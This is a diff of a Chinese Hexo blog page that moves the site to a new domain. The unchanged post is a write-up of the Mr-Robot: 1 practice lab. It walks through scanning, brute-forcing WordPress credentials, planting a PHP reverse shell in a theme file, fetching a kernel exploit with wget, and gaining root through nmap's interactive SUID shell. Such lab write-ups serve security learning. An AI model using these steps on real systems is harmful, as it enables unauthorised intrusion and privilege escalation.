@@ -5,52 +5,52 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 6.0.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/wan1/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/wan1/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/wan1/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/wan1/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/wan1/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/wan1/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"wanheiqiyihu.gitee.io","root":"/wan1/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"wanheiqiyihu.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="Mr-Robot: 1信息收集首先还是用nmap拿到对面的ip地址,靶机记得开nat 1nmap  -n -sP -sn 192.168.100.0&#x2F;24   nmap -A 192.168.100.171 22,80,443端口 应该又是一场web  1dirb http:&#x2F;&#x2F;192.168.100.171&#x2F;   大多都是403，只有一个登录界面有权限，还有一个robots.txt   第一个文">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mr-Robot: 1">
-<meta property="og:url" content="https://wanheiqiyihu.gitee.io/wan1/2022/11/10/Mr-Robot-1/index.html">
+<meta property="og:url" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/index.html">
 <meta property="og:site_name" content="十三の博客">
 <meta property="og:description" content="Mr-Robot: 1信息收集首先还是用nmap拿到对面的ip地址,靶机记得开nat 1nmap  -n -sP -sn 192.168.100.0&#x2F;24   nmap -A 192.168.100.171 22,80,443端口 应该又是一场web  1dirb http:&#x2F;&#x2F;192.168.100.171&#x2F;   大多都是403，只有一个登录界面有权限，还有一个robots.txt   第一个文">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/Mr-Robot-1.jpg">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110111230278.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110111613077.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110112652658.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110112936692.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110111721740.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110112147271.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110114210530.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110114718865.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110115211320.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110122205300.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110122339397.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110122504710.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110122936419.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110123255149.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110123931959.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110124024386.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/Mr-Robot-1.jpg">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110111230278.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110111613077.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110112652658.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110112936692.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110111721740.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110112147271.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110114210530.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110114718865.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110115211320.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110122205300.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110122339397.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110122504710.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110122936419.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110123255149.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110123931959.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/image-20221110124024386.png">
 <meta property="article:published_time" content="2022-11-10T04:42:29.000Z">
 <meta property="article:modified_time" content="2022-11-10T07:57:50.000Z">
 <meta property="article:author" content="十三">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/10/Mr-Robot-1/Mr-Robot-1.jpg">
+<meta name="twitter:image" content="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/Mr-Robot-1.jpg">
 
-<link rel="canonical" href="https://wanheiqiyihu.gitee.io/wan1/2022/11/10/Mr-Robot-1/">
+<link rel="canonical" href="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/">
 
 
 <script id="page-configurations">
@@ -112,7 +112,7 @@
 
   <div class="site-meta">
 
-    <a href="/wan1/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">十三の博客</h1>
       <span class="logo-line-after"><i></i></span>
@@ -133,92 +133,92 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/wan1/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/wan1/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-ctf做题笔记">
 
-    <a href="/wan1/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
+    <a href="/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
 
   </li>
         <li class="menu-item menu-item-python">
 
-    <a href="/wan1/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
+    <a href="/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
 
   </li>
         <li class="menu-item menu-item-java">
 
-    <a href="/wan1/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
+    <a href="/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
 
   </li>
         <li class="menu-item menu-item-读书笔记">
 
-    <a href="/wan1/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
+    <a href="/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
 
   </li>
         <li class="menu-item menu-item-渗透测试">
 
-    <a href="/wan1/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
+    <a href="/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
 
   </li>
         <li class="menu-item menu-item-基础">
 
-    <a href="/wan1/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
+    <a href="/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
 
   </li>
         <li class="menu-item menu-item-轮子">
 
-    <a href="/wan1/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
+    <a href="/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
 
   </li>
         <li class="menu-item menu-item-漏洞库">
 
-    <a href="/wan1/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
+    <a href="/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
 
   </li>
         <li class="menu-item menu-item-工具">
 
-    <a href="/wan1/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
+    <a href="/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
 
   </li>
         <li class="menu-item menu-item-代码审计">
 
-    <a href="/wan1/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
+    <a href="/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
 
   </li>
         <li class="menu-item menu-item-逆向">
 
-    <a href="/wan1/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
+    <a href="/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
 
   </li>
         <li class="menu-item menu-item-应急响应">
 
-    <a href="/wan1/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
+    <a href="/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
 
   </li>
         <li class="menu-item menu-item-免杀">
 
-    <a href="/wan1/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
+    <a href="/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
 
   </li>
         <li class="menu-item menu-item-靶场">
 
-    <a href="/wan1/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
+    <a href="/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
 
   </li>
         <li class="menu-item menu-item-cve申请">
 
-    <a href="/wan1/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
+    <a href="/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
 
   </li>
         <li class="menu-item menu-item-c语言">
 
-    <a href="/wan1/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
+    <a href="/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -276,10 +276,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2022/11/10/Mr-Robot-1/">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/wan1/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="十三">
       <meta itemprop="description" content="潜心学习，不骄不躁">
     </span>
@@ -308,7 +308,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/wan1/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
+                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
                 </span>
             </span>
 
@@ -326,58 +326,58 @@
         <h1 id="Mr-Robot-1"><a href="#Mr-Robot-1" class="headerlink" title="Mr-Robot: 1"></a>Mr-Robot: 1</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先还是用nmap拿到对面的ip地址,靶机记得开nat</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -n -sP -sn 192.168.100.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/Mr-Robot-1.jpg" alt="image-20221110110904031"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/Mr-Robot-1.jpg" alt="image-20221110110904031"></p>
 <p><code>nmap -A 192.168.100.171</code></p>
 <p>22,80,443端口</p>
 <p>应该又是一场web</p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110111230278.png" alt="image-20221110111230278"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111230278.png" alt="image-20221110111230278"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.100.171/</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110111613077.png" alt="image-20221110111613077"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111613077.png" alt="image-20221110111613077"></p>
 <p>大多都是403，只有一个登录界面有权限，还有一个robots.txt</p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110112652658.png" alt="image-20221110112652658"></p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110112936692.png" alt="image-20221110112936692"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112652658.png" alt="image-20221110112652658"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112936692.png" alt="image-20221110112936692"></p>
 <p>第一个文件是一堆不知道什么玩意的文件</p>
 <p>073403c8a58a1f80d943455fb30724b9（第二个文件是一串字符）</p>
 <p><code>whatweb http://192.168.100.171/wp-login</code></p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110111721740.png" alt="image-20221110111721740"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111721740.png" alt="image-20221110111721740"></p>
 <p>没找到cms，没有测试到sql(后面才看到是wordpress的博客)</p>
 <p>又扫到一个<code>http://192.168.100.171/admin/index.html</code></p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110112147271.png" alt="image-20221110112147271"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112147271.png" alt="image-20221110112147271"></p>
 <p>随后查攻略得知，上面那个不知道什么玩意的文件是一堆用户名，在后台忘记密码的那个地方进行爆破。</p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110114210530.png" alt="image-20221110114210530"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110114210530.png" alt="image-20221110114210530"></p>
 <p>爆破出用户名为Elliot，再用这个字典爆破密码，密码为ER28-0652</p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110114718865.png" alt="image-20221110114718865"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/2022/11/10/Mr-Robot-1/image-20221110114718865.png" alt="image-20221110114718865"></p>
 <p>直接把马弄上去</p>
 <p>地址为<code>http://192.168.100.171/wordpress/wp-content/themes/twentyfifteen/404.php</code></p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110115211320.png" alt="image-20221110115211320"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110115211320.png" alt="image-20221110115211320"></p>
 <p>随后改成反弹shell的php</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/webshells/php</span><br><span class="line"></span><br><span class="line">cat php-reverse-shell.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110122205300.png" alt="image-20221110122205300"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122205300.png" alt="image-20221110122205300"></p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>还是先弄一个tty出来</p>
 <p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110122339397.png" alt="image-20221110122339397"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122339397.png" alt="image-20221110122339397"></p>
 <p><code>lsb_release -a</code>查看linux版本信息</p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110122504710.png" alt="image-20221110122504710"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122504710.png" alt="image-20221110122504710"></p>
 <p>Ubuntu 14.04</p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110122936419.png" alt="image-20221110122936419"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122936419.png" alt="image-20221110122936419"></p>
 <p>下载exp</p>
 <p>用python传过去</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 2333</span><br><span class="line">mkdir /tmp/sh(如果是提权的话，目前用户需要先创建一个可以创建新文件的文件夹进行操作)</span><br><span class="line">cd /tmp/sh</span><br><span class="line">wget http://192.168.101.20:2333/42276.c</span><br></pre></td></tr></table></figure>
 
 <p>编译</p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110123255149.png" alt="image-20221110123255149"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110123255149.png" alt="image-20221110123255149"></p>
 <p>出错了，我们换一个exp</p>
 <p>又出错了。。</p>
 <p>后来发现需要使用suid提权</p>
 <p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
 <p>寻找具有suid权限的文件</p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110123931959.png" alt="image-20221110123931959"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110123931959.png" alt="image-20221110123931959"></p>
 <p>有nmap</p>
 <p><code>nmap --interactive</code></p>
 <p><code>!sh</code></p>
-<p><img src="/wan1/wan1/2022/11/10/Mr-Robot-1/image-20221110124024386.png" alt="image-20221110124024386"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110124024386.png" alt="image-20221110124024386"></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zijiaijd/article/details/117165224">(122条消息) nmap提权几种方式_1winner的博客-CSDN博客_nmap提权</a></p>
 
     </div>
@@ -394,11 +394,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/wan1/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/" rel="prev" title="花生壳解决没有公网ip反弹shell">
+    <a href="/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/" rel="prev" title="花生壳解决没有公网ip反弹shell">
       <i class="fa fa-chevron-left"></i> 花生壳解决没有公网ip反弹shell
     </a></div>
       <div class="post-nav-item">
-    <a href="/wan1/2022/11/12/%E9%80%9A%E8%BF%87%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8q%E7%9B%BE%E5%8F%8D%E6%B2%99%E7%AE%B1/" rel="next" title="通过检测是否存在q盾反沙箱">
+    <a href="/2022/11/12/%E9%80%9A%E8%BF%87%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8q%E7%9B%BE%E5%8F%8D%E6%B2%99%E7%AE%B1/" rel="next" title="通过检测是否存在q盾反沙箱">
       通过检测是否存在q盾反沙箱 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -466,14 +466,14 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="十三"
-      src="/wan1/images/avatar.gif">
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">十三</p>
   <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/wan1/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">172</span>
           <span class="site-state-item-name">日志</span>
@@ -534,48 +534,48 @@
   </div>
 
   
-  <script src="/wan1/lib/anime.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/wan1/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/wan1/js/motion.js"></script>
-
-
-<script src="/wan1/js/schemes/pisces.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/wan1/js/next-boot.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-  
-
-
-
-
-  
-<script src="/wan1/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
 
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
   
 
-<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/src/clicklove.js"></script>
